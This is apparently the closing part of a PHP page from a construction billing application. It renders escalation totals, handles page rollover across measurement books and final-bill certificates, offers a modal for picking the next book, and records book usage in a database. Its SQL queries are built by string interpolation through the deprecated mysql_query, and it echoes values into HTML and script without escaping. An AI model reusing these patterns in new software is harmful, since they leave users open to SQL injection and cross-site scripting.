		echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($ETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
		//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
//print_r($RevEscQtrArray);
if(count($RevEscQtrArray) >0)
{
	for($q2=0; $q2<count($RevEscQtrArray); $q2++)
	{
		$RevEQtr = $RevEscQtrArray[$q2];
		$RevETccAmt = $RevEscTccAmtArray[$q2];
		//$ETcaAmt = $EscTcaAmtArray[$q1];
		echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>Revised Escalation for Quarter - ".$RevEQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($RevETccAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
		//echo "<tr style='border:none'><td style='border:none' class='labelprint' align='right' colspan='6'>10-CA Escalation for Quarter - ".$EQtr." : <i class='fa fa-inr' style='font-weight:normal; width:4px; height:5px;'> </td><td style='border:none' class='labelprint' align='right' colspan='3'>&nbsp;</td><td colspan='2' align='right' class='labelprint' style='border:none;'>".number_format($ETcaAmt, 2, '.', '')."</td><td style='border:none;'>&nbsp;</td></tr>";
	}
}
echo "<tr><td colspan='12' align='center' class='labelprint' style='border-bottom:2px solid white;border-left:2px solid white;border-right:2px solid white;'>Page ".$page."</td></tr>";
echo "</table>";

/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }

if($_SESSION["final_bill"] == "Y"){
$CertCodeArr = array(); $CertDescArr = array(); $CertMBArr = array(); $CertPageArr = array();
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillInspectionCertificate.php");
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillNoClaimCertificate.php");
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillFinalCertificates.php");
echo "<p style='page-break-after:always;'></p>";
$page++;
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
include("FinalBillFinalNotes.php");
}
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
if($page > 100){ if($NextMBFlag == 0){ $NextMBOption = $NextMBOption + 1; $page = 1; }else{ $UsedMBArr[$abstmbno][1] = $page-1; $UsedMBArr[$abstmbno][2] = 0; $abstmbno = $NextMBList[$NextMbIncr]; $page = $NextMBPageList[$NextMbIncr]; $NextMbIncr++; } }
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$UsedMBArr[$abstmbno][1] = $page;
$UsedMBArr[$abstmbno][2] = 1;
//print_r($UsedMBArr);
//echo $NextMBOption;exit;
?>
<div class="modal fade" id="myModal">
  <div class="modal-dialog">
    <div class="modal-content">
      <div class="modal-header">
        <h4 class="modal-title">MBook List</h4>
      </div>
      <div class="modal-body" style="min-height:150px">
       <div style="width:55%; display:inline; float:left;">
	   	 <div style="height:20px">
		 	Click below box to select multiple Mbooks :
		 </div>
	   	 <div>
		 	<select id="NextMB" class="NextMB" multiple="multiple" style="width:400px;">
			   <option value=""> ------ Select Next MBook Nos ------</option>
			   <?php echo $objBind->BindNextMBlist($abstsheetid,'A',$abstmbno); ?>
			</select>
			<br/><br/><br/>
			<div style="color:#FB133C; font-size:12px; font-weight:normal">* To select more than one mbook click again the above text box</div>
			<div style="color:#FB133C" align="center"><br />OR</div>
			<div style="color:#FB133C; font-size:12px; font-weight:normal"><br />* Press [Ctrl key] and Click the above text box </div>
		 </div>
	    </div>
		<div style="width:30%; display:inline; float:right">
			<div class="mbpgdiv" style="height:18px; color:#009ED2">&nbsp;Selected MBook No. & Page No.</div>
			<div id="MBPageRefSec"></div>
		</div>
      </div>

      <div class="modal-footer" style="text-align:center !important;">
        <button type="button" class="modal-btn-c" data-dismiss="modal">CLOSE</button>
        <input type="submit" name="modal_btn_next_mb" id="modal_btn_next_mb" class="modal-btn-n" value=" NEXT " />
      </div>
    </div><!-- /.modal-content -->
  </div><!-- /.modal-dialog -->
</div><!-- /.modal -->


<?php if($NextMBOption > 0){ ?>
	<script>
		var NoOfMB = "<?php echo $NextMBOption; ?>";
		BootstrapDialog.alert("You need to select next "+NoOfMB+" MBook to generate Abstract");
		$('#myModal').modal({backdrop:'static', keyboard:true, show:true});
		$(function(){
			$('#NextMB').change(function(event){ 
				var sheetid 		= 	$("#txt_sheet_id").val();
				var staffid			=	$("#txt_staffid").val();
				var rbn				=	$("#txt_rbn").val();
				var generatetype 	= 	"cw";
				$("#MBPageRefSec").html('');
				var x = 1;
				$.each($("#NextMB option:selected"), function(){   //alert($(this).text())
					var mbid 			= 	 $(this).val();//$("#NextMB option:selected").attr('value');//alert(currentmbooknovalue);
					var mbno 			= 	 $(this).text();//$("#NextMB option:selected").text();
					if(mbid != ""){
						$.post("MBookNoService.php", {currentmbook: mbid, currentbmookname: mbno, sheetid: sheetid, generatetype: generatetype, staffid: staffid, currentrbn: rbn}, function (data) { //alert(data);
							var pageno = data;
							var OutStr = "<div class='mbpgdiv'>MBook No. <input type='text' name='txt_next_mb"+x+"' class='mbtxt' value='"+mbno+"' readonly=''> &nbsp;Page : <input type='text' name='txt_next_mbpage"+x+"' class='mbtxt' value='"+pageno+"' readonly=''><input type='hidden' name='txt_no[]' class='mbtxt' value='"+x+"' readonly=''></div>";
							$("#MBPageRefSec").append(OutStr);
							x++;
						});
					}
				});
				
				/*var result = []; 
			 	var options = select && select.options; alert();
			    var opt;
			    for (var i=0, iLen=option.length; i<iLen; i++) {
				  opt = option[i];
				  if (opt.selected) {
				    result.push(opt.value || opt.text);
				  }
			    }
			    var res = result.join(",");
				alert(res);*/
				
				
				
			});
		});
	</script>
<?php }
//$GenVersion = getPrintVersion($abstsheetid,$rbn,'A','abstract',0);
//echo $GenVersion;
$delete_mymbook_sql = "delete from mymbook where rbn = '$rbn' and sheetid = '$abstsheetid' and staffid = '$staffid' and mtype = 'A' and genlevel = 'abstract'";
$delete_mymbook_query = mysql_query($delete_mymbook_sql);
/*if($newmbookno == "")
{
	$insert_mymbook_sql = "insert into mymbook set mbno = '$oldabstmbno', startpage = '$oldabstmbpage', endpage = '$page', rbn = '$rbn', sheetid = '$abstsheetid', staffid = '$staffid', mtype = 'A', genlevel = 'abstract', mbookorder = 1, active = 1, gen_version = '$GenVersion'";
	$insert_mymbook_query = mysql_query($insert_mymbook_sql);
}
else
{
	$insert_mymbook_sql1 = "insert into mymbook set mbno = '$oldabstmbno', startpage = '$oldabstmbpage', endpage = '100', rbn = '$rbn', sheetid = '$abstsheetid', staffid = '$staffid', mtype = 'A', genlevel = 'abstract', mbookorder = 1, active = 1, gen_version = '$GenVersion'";
	$insert_mymbook_query1 = mysql_query($insert_mymbook_sql1);
	$insert_mymbook_sql2 = "insert into mymbook set mbno = '$abstmbno', startpage = '$newabstmbpage', endpage = '$page', rbn = '$rbn', sheetid = '$abstsheetid', staffid = '$staffid', mtype = 'A', genlevel = 'abstract', mbookorder = 2, active = 1, gen_version = '$GenVersion'";
	$insert_mymbook_query2 = mysql_query($insert_mymbook_sql2);
}*/
/////////// THIS IS FOR MULTIPLE MB SELECT CHANGE ON JUNE 2019 //////////
$MBord = 1;
//print_r($UsedMBArr);
foreach($UsedMBArr as $UsedMB => $UsedMbDet){
	$UsedMBStartpage = $UsedMbDet[0];
	$UsedMBEndpage 	 = $UsedMbDet[1];
	$UsedMBStatus 	 = $UsedMbDet[2];
	//echo $UsedMB." = ".$UsedMBStartpage." = ".$UsedMBEndpage." = ".$UsedMBStatus."<br/>";
	if(($UsedMBStartpage != '')&&($UsedMBEndpage != '')){
		$insert_mymbook_sql2 = "insert into mymbook set mbno = '$UsedMB', startpage = '$UsedMBStartpage', endpage = '$UsedMBEndpage', rbn = '$rbn', sheetid = '$abstsheetid', staffid = '$staffid', mtype = 'A', genlevel = 'abstract', mbookorder = '$MBord', active = 1, gen_version = '$GenVersion', generatedate = NOW()";
		$insert_mymbook_query2 = mysql_query($insert_mymbook_sql2);
		$MBord++;
	}
}

/*echo "<p  style='page-break-after:always;'></p>";
for($x=0;$x<$emptypage;$x++)
{
$page++;
echo $table;
echo "<table width='1087px' bgcolor='white'   border='0' cellpadding='3' cellspacing='3' align='center' class='label'>";
echo $tablehead;
$y=1;
while($y<22)
{
?>
	<!--<tr>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='20%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='8%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='4%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='7%' class='labelsmall'>&nbsp;</td>
	<td  align='right' width='10%' class='labelsmall'>&nbsp;</td>
	<td  align='left' width='5%' class='labelsmall'>&nbsp;</td>
</tr>-->
	<?php
	$y++;		
}
echo "<tr style='border:none'><td colspan='12' style='border:none' align='center'>Page ".$page."</td></tr>";
echo "</table>";
echo "<p  style='page-break-after:always;'></p>";
//$page++;
}*/
?>
<input type="hidden" name="txt_abstmbno" id="txt_abstmbno" value="<?php echo $abstmbno; ?>" />
<input type="hidden" name="txt_maxpage" id="txt_maxpage" value="<?php echo $page; ?>" />

<input type="hidden" name="table_group_count" id="table_group_count" value="<?php echo $table_group_row; ?>" />
<input type="hidden" name="txt_sheet_id" id="txt_sheet_id" value="<?php echo $abstsheetid; ?>" />
<input type="hidden" name="txt_staffid" id="txt_staffid" value="<?php echo $_SESSION['sid']; ?>" />
<input type="hidden" name="txt_rbn" id="txt_rbn" value="<?php echo $rbn; ?>" />
<!--<div align="center" class="btn_outside_sect printbutton">
	<div class="btn_inside_sect"><input type="button" class="backbutton" name="print" value=" Print " onclick="printBook();" /></div>
	<div class="btn_inside_sect"><input type="button" name="Back" value="Back" id="back" class="backbutton" onclick="goBack();" /> </div>
</div> -->
<br/>
<?php 
if((isset($_SESSION["abst_method"]))&&($_SESSION["abst_method"] == "ZMSA")){
	$Url = "SecuredAdvanceGenerate";
}else{
	$Url = "RABGenerateInitiate";
}
?>
<input type="button" name="Back" value="Back" id="<?php echo $Url; ?>" class="BottomContent1" onclick="goBack(this);" />
		<!-- modal content -->
		<!--<div id="basic-modal-content">
			<div align="center" class="popuptitle">Part Payment Work Sheet</div>
			<div align="center" style="padding-top:10px;">
			<table class="label table2" width="100%" cellpadding="3" cellspacing="3" id="table2">
				<tr bgcolor="">
					<td width="60px" align="left">Item No.</td>
					<td width="">
						<input type="text" readonly="" name="txt_item_no" id="txt_item_no" size="8" class="popuptextbox" />
						<input type="hidden" name="txt_item_id" id="txt_item_id" size="8" class="popuptextbox" />
					</td>
					<td width="60px" align="center">RAB No.</td>
					<td width="">
						<input type="text" name="txt_rab_no" id="txt_rab_no" size="6" class="popuptextbox" value="<?php echo $rbn; ?>" />
					</td>
					<td  align="left" colspan="4">Measurement Date - From &nbsp; :
						<input type="text" name="txt_from_date" id="txt_from_date" size="12" class="popuptextbox" value="<?php echo dt_display($fromdate); ?>" />
					To :
						<input type="text" name="txt_to_date" id="txt_to_date" size="12" class="popuptextbox" value="<?php echo dt_display($todate); ?>" />
					</td>
				</tr>
				<tr bgcolor="">
				<td width="135px" align="left">Item Description</td>
					<td width="700px" align="left" colspan="7">
						<textarea name="txt_item_desc" id="txt_item_desc" class="popuptextbox" rows="2" style="text-align:left; width:820px; height:34px;"></textarea>
					</td>
				</tr>

			</table>
			</div>
			<div style="padding-top:10px; height:325px;">
				<div style="float:left; width:567px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="94%" id="table3">
					<tr bgcolor="#0080ff" style="color:#FFFFFF">
						<td align="center" colspan="7">Deduct Previous Measurement</td>
					</tr>
					<tr>
						<td align="left" colspan="7" bgcolor="#f2efef">
						Deduct Previous Measurement Total Quantity&nbsp;&nbsp;&nbsp;:&nbsp;&nbsp;
						<input type="text" name="txt_dpm_qty" id="txt_dpm_qty" size="17" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
						</td>
					</tr>
					<tr>
						<td width="10px" rowspan="2" align="center">RBN.</td>
						<td width="61px" rowspan="2" align="center">Item Qty.</td>
						<td width="63px" rowspan="2" align="center">Rate&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Paid Details</td>
						<td colspan="2" align="center" bgcolor="#eaeae8">Payable Details</td>
					</tr>
					<tr>
						<td width="23px" align="center">(%)</td>
						<td width="110px" align="center">Amount&nbsp; <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
						<td width="23px" align="center">(%)</td>
						<td style='width:110px' align="center">Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i> </td>
					</tr>
					<tr>
						<td colspan="4" align="right">Total Amount <i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
						<td align="left"><input type="text" name="txt_partpay_total_paidamt_dpm" id="txt_partpay_total_paidamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
						<td colspan=""></td>
						<td colspan=""><input type="text" name="txt_partpay_total_payableamt_dpm" id="txt_partpay_total_payableamt_dpm" class="dynamictextbox" style="text-align:right; width:100px;pointer-events: none;" /></td>
					</tr>
					<tr>
						<td colspan="7">Remarks:<br/><textarea name="txt_dpm_remarks" id="txt_dpm_remarks" rows="3" style="width:519px;"></textarea>
						</td>
					</tr>
				</table>
				</div>
				<div style="float:right;  width:427px; height:320px; overflow-y: auto;">
					<table class="label table2" cellpadding="3" cellspacing="3" width="93%" id="table4">
						<tr bgcolor="#0080ff" style="color:#FFFFFF">
							<td align="center" colspan="5">Since Last Measurement</td>
						</tr>
						<tr>
							<td align="left" colspan="5" bgcolor="#f2efef">
							Since Last Measurement Quantity&nbsp;:&nbsp;
							<input type="text" name="txt_slm_qty" id="txt_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							<input type="hidden" name="hid_slm_qty" id="hid_slm_qty" size="13" class="popuptextbox" style="text-align:left; background-color:#f2efef" />
							</td>
						</tr>
						<tr>
							<td width="61px" align="center">Item Qty.</td>
							<td width="63px" align="center">Rate&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="23px" align="center">(%)</td>
							<td width="50px" align="center">Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i></td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr id='rowid0'>
							<td width="61px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_qty_slm[]" id="txt_partpay_qty_slm0" class="dynamictextbox" style="text-align:right; width:93px; border: 1px solid #2aade4;" onblur="ValidateSlm(); calculateAmount(this,0,'qty','slm');" />
							</td>
							<td width="63px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_item_rate_slm" readonly="" id="txt_item_rate_slm0" class="dynamictextbox" style="text-align:right; width:80px;" onblur="calculateAmount(this,0,'rate','slm');" />
							</td>
							<td width="23px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_percent_slm" id="txt_partpay_percent_slm0" class="dynamictextbox" style="text-align:right; width:40px; border: 1px solid #2aade4;" onblur="ValidatePercent(this,'slm',0); calculateAmount(this,0,'percent','slm');" />
							</td>
							<td width="50px" align="center" class="dynamicrowcell">
							<input type="text" name="txt_partpay_amt_slm[]" id="txt_partpay_amt_slm0" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center" class="dynamicrowcell" style="text-align:center;">
							<input type="button" name="btn_add_row_slm" id="btn_add_row_slm" class="editbtnstyle" value=" + " style="width:32px; text-align:center; font-weight:bold; border-radius: 0px;" onclick="addRow();" />
							<input type="hidden" name="hid_slm_result[]" id="hid_slm_result0" class="dynamictextbox" />
							</td>
						</tr>
						<tr>
							<td width="147px" colspan="3" align="right">Total Amount&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;</td>
							<td width="50px" align="right"  class="dynamicrowcell">
							<input type="text" name="txt_partpay_total_amt_slm" id="txt_partpay_total_amt_slm" class="dynamictextbox" style="text-align:right; width:130px;pointer-events: none;" />
							</td>
							<td width="10px" align="center">&nbsp;</td>
						</tr>
						<tr>
							<td colspan="5">Remarks:<br/><textarea name="txt_slm_remarks" id="txt_slm_remarks" rows="3" style="width:375px;"></textarea>
							</td>
						</tr>
					</table>
				</div>
			</div>
			<div align="right">
				<table width="100%" height="65" class="label" cellpadding="3" cellspacing="3">
					<tr>
					<td align="right" width="440px">
					<label style="background:#EAEAEA; padding:6px;">Over All Total Amount</label>&nbsp;:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<i class='fa fa-inr' style=' width:4px; height:5px;'></i>&nbsp;
					<input type="text" name="txt_overall_total" id="txt_overall_total" size="20" class="dynamictextbox dynamictextbox2" />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
					</td>
					</tr>
				</table>
			</div>
			<div class="bottomsection" align="center">
				<div class="buttonsection" align="center"><input type="button" name="btn_save" id="btn_save" value=" Save " class="buttonstyle" onclick="SaveData()" /></div>
				<div class="buttonsection" align="center"><input type="button" name="btn_cancel" id="btn_cancel" value=" Cancel " class="buttonstyle" onclick="CancelData()" /></div>
			</div>
		</div>
		
		<!-- preload the images -->
		<!--<div style='display:none'>
			<img src='img/basic/x.png' alt='' />
		</div>     -->
</form>
<script type="text/javascript">
	$(function(){ 
		$(".NextMB").chosen();
		var textBoxStr = "<?php echo $DIEITextBoxStr; ?>";
		if(textBoxStr != "")
		{
			var splitval = textBoxStr.split("*"); //alert(splitval.length);
			var x=0;
			for(x=0;x<splitval.length;x+=3)
			{
				document.getElementById("txt_co_di_ei"+splitval[x]).value = "C/o to page "+splitval[x+1]+"/General MB No. "+splitval[x+2]; 
			}
		}
   });
</script>
<style>
	.BottomContent1{
		position: fixed;
		bottom: 2px;
		right: 30px;
		z-index: 99;
		border: none;
		outline: none;
		background-color: #f24343;
		color: white;
		padding: 5px;
		border-radius: 10px;
		width: 100px;
		font-weight: bold;
		text-align: center;
		vertical-align: middle;
		pointer-events: none;
		cursor:pointer;
		pointer-events:auto;
		background-color:#009ff4;
		font-size:14px;
		letter-spacing:1px;
		padding:6px;
		font-family:Verdana, Arial, Helvetica, sans-serif;
		font-weight:bold;
		background-color:#D9044F;
		color:#FFFFFF;
		border:1px solid #D9044F;
		cursor:pointer;
		padding-left:10px;
		padding-right:10px;
		font-size:14px;
	}
	.BottomContent1:hover{
		background-color:#C90133;
	}
	.modal-body {
		font-size: 12px;
		font-family:Verdana, Arial, Helvetica, sans-serif;
		color:#002D95;
		font-weight:600;
	}
	.mbpgdiv{
		padding:5px;
		border:1px solid #EBEBEB;
	}
	.mbtxt{
		padding:1px 5px 1px 5px;
		width:30px;
		border:1px solid #4096FF;
		text-align:right
	}
	.modal-btn-n{
		padding:8px;
		border:1px solid #0156E4;
		background:#0156E4;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
	.modal-btn-n:hover{
		background:#0048CE;
		border:1px solid #0048CE;
	}
	.modal-btn-c{
		padding:8px;
		border:1px solid #F1015B;
		background:#F1015B;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
	.modal-btn-c:hover{
		background:#D5004A;
		border:1px solid #D5004A;
	}
	.bootstrap-dialog-footer-buttons > .btn-default{
		padding:8px;
		border:1px solid #0156E4;
		background:#0156E4;
		color:#FFFFFF;
		cursor:pointer;
		letter-spacing:1px;
		font-weight:bold;
		font-size:12px;
	}
</style>
</body>

</html>